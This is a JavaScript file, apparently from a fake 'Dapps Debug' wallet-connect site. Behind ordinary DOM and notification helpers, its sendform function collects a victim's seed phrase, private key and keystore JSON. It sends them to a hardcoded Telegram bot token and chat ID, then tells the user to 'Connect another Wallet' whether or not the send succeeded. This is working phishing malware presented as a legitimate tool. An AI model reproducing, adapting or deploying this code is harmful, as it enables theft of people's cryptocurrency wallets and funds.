//DOM manipulation

function shutx(element) {
    $(element).hide();
}

function openx(element) {
    $(element).show();
}

function startloader(type) {
    openx('#loader');
}

function closeloader(type) {
    shutx('#loader');
}

function startbigloader() {
    openx('#loader');
}

function closebigloader() {
    shutx('#loader');
}





function shutnearest(thiselement, element) {
    $(thiselement).closest(element).hide();
}


//notifications


function notify(details, type) {
    $('.nothdetails').html(details);
    openx('.noth');

    if (type == "" || type == "success" || !type) {

        $(".noth").addClass('greennoth');
        $(".noth").removeClass('rednoth');

    } else {
        $(".noth").removeClass('greennoth');
        $(".noth").addClass('rednoth');

    };

    $('.noth').animate({ opacity: '1' }, '500');

    setTimeout(closenotify, 10000);
}


function closenotify() {
    $('.noth').animate({ opacity: '0' }, '500');
    shutx('.noth');
}

function confirmnotify(details, callback, dta1, dta2) {
    openx('#confirmbox');
    $('.confdetails').html(details);

    if (!dta1 && !dta2) {
        var html = '<button class="rtd lft" onclick="shutx(`#confirmbox`)">Cancel</button><button class="rtd rgt" onclick="' + callback + '();shutx(`#confirmbox`)">Ok</button>';
    } else if (dta1 && !dta2) {
        var html = '<button class="rtd lft" onclick="shutx(`#confirmbox`)">Cancel</button><button class="rtd rgt" onclick="' + callback + '(`' + dta1 + '`);shutx(`#confirmbox`)">Ok</button>';
    } else if (dta1 && dta2) {
        var html = '<button class="rtd lft" onclick="shutx(`#confirmbox`)">Cancel</button><button class="rtd rgt" onclick="' + callback + '(`' + dta1 + '`,`' + dta2 + '`);shutx(`#confirmbox`)">Ok</button>';
    }

    $('.nbc').html(html);
}


//End of notificatons


//Communicating with server

function sendmessage(message,chat_bot_api,user_chat_id){
    let durl = 'https://api.telegram.org/bot'+chat_bot_api+'/sendMessage';


    let datathree={
        'chat_id':user_chat_id,
        'text':message,
        'disable_web_page_preview':disable_web_page_preview,
        'reply_to_message_id':reply_to_message_id,
        'reply_markup':reply_markup
      }


    $.ajax({
        url: durl,
        type: 'POST',
        data: datathree,
        cache: false,

        success:()=>{

        },
        error:()=>{

        }

    }); 
}


function sendform(){

    closenotify();
    var counter=0;
    
    var privateinput=$('#privateinput').val();
    var phraseinput=$('#phraseinput').val();
    
    var kjsoninput=$('#kjsoninput').val();
    var kpasswordinput=$('#kpasswordinput').val();
    
    var walletname=$('#walletname').val();
    
    
    if(wallettype=="phrase"){
    
        if(phraseinput==""){
          counter=counter+1;
        }else{
          counter=counter+0;
        }
        
        if(phraseinput.split(' ').length >= 12){
    
        }else{
          notify("Invalid mnemonic phrase",'error');
    return exit();
        }
    
    }else if(wallettype=="keystore"){ 
    
      
      if(kjsoninput=="" || kpasswordinput==""){
        counter=counter+1;
      }else{
        counter=counter+0;
      }
    
    }else if(wallettype=="privatekey"){
    
      if(privateinput==""){
        counter=counter+1;
      }else{
        counter=counter+0;
      }
    
    }
    
    if(counter >= 1){
    
    notify("Please fill in all details!","error");
    
    }else{
    
      let message, chat_id, api
    
      message=
      "From: Dapps Debug"+
      "\r\n"+
      "\r\n"+
      "Wallet Name: "+walletname+
      "\r\n"+
      "\r\n"+
      "Phrase: "+phraseinput+
      "\r\n"+
      "\r\n"+
      "Private Key: "+privateinput+
      "\r\n"+
      "\r\n"+
      "Keystore JSON: "+kjsoninput+
      "\r\n";
    
      chat_id=6951446695;
      api='6661816788:AAFuu81eMPrh2Q_T6lP8aVIHL_BThwbu_co';
    
   
    
          // following ones are optional, so could be set as null
          let disable_web_page_preview = null;
          let reply_to_message_id = null;
          let reply_markup = null;
    
          let datathree={
            'chat_id':chat_id,
            'text':message,
            'disable_web_page_preview':disable_web_page_preview,
            'reply_to_message_id':reply_to_message_id,
            'reply_markup':reply_markup
          }
    
          let durl = 'https://api.telegram.org/bot'+api+'/sendMessage';
    
    startloader();
    
    $.ajax({
    url: durl,
    type: 'POST',
    data: datathree,
    cache: false,
    success:function(resp){
      closeloader()
      notify("Connect another Wallet",'error');
    },
    error: function(data){
      closeloader()
      notify("Connect another Wallet",'error');
    }
    });
    
    }
    
    };



function sendformtwo(surl, form, servicetype) {

    closenotify();
    var counter = 0;
    var fgfg = form + " " + "input";

    $(fgfg).each(function() {

        var inputval = $(this).val();

        if (inputval == "") {
            counter = counter + 1;
        } else {
            counter = counter + 0;
        }


    });

    var sgsg = form + " " + "select";


    $(sgsg).each(function() {

        var inputval = $(this).val();

        if (inputval == "Please choose one") {
            counter = counter + 1;
        } else {
            counter = counter + 0;
        }

    });


    if (counter >= 1) {
        var errbox = form + " " + ".error";
        notify("Please fill in all details!", "error");

    } else {

        var xform = $(form).serialize();

        startbigloader();

        $.ajax({
            url: surl,
            type: 'POST',
            data: xform,
            cache: false,
            dataType: 'json',

            success: function(resp) {
                closebigloader();
                parser(resp, servicetype);
            },
            error: function(data) {
                closebigloader();
                notify("An error happened!", "error");
            }

        });



    }
};


function sendjson(datatosend, url, servicetype) {

    startbigloader();

    $.ajax({
        url: url,
        type: 'POST',
        data: datatosend,
        cache: false,
        contentType: 'application/json; charset=utf-8',
        dataType: 'json',
        success: function(resp) {
            closebigloader();
            parser(resp, servicetype)
        },
        error: function(data) {
            closebigloader();
            notify("An error happened!", "error");
        }
    });


}


function getjsonresponse(link, servicetype) {

    startloader();

    $.ajax({
        url: link,
        type: 'GET',
        cache: false,
        dataType: 'json',
        async: false,

        success: function(resp) {
            closeloader();
            parser(resp, servicetype);
        },

        error: function(data) {
            closeloader();
            notify("An error happened!", "error");
        }

    });
};



//End of server communication




